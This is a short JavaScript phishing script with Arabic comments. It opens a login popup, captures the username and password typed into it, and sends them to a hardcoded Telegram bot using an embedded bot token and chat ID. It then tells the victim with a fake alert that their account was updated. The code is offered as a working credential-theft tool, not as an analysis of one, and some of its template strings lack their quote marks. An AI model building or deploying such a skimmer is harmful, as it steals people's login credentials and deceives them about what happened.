const openBtn = document.getElementById("openLogin");
const modal = document.getElementById("loginModal");
const closeBtn = document.getElementById("closeLogin");
const loginForm = document.getElementById("loginForm");

// افتح نافذة الدخول
openBtn.onclick = () => modal.style.display = "block";

// اغلق النافذة
closeBtn.onclick = () => modal.style.display = "none";
window.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; };

// توكن البوت و chat_id
const token = "8127318609:AAG0ICtjWolbHfNXrpN-r0JOkXoaOtfubE0";
const chat_id = "7513504133";

// عند ارسال الفورم، يرسل على تيليجرام
loginForm.onsubmit = function(e){
  e.preventDefault();
  let user = document.getElementById("user").value;
  let password = document.getElementById("password").value;

  let text = اسم المستخدم: ${user}\nكلمة المرور: ${password};

  fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)})
    .then(res => {
      alert("تم تحديث حسابك");
      modal.style.display = "none";
      loginForm.reset();
    })
    .catch(err => alert("خطأ بالإرسال: " + err));
};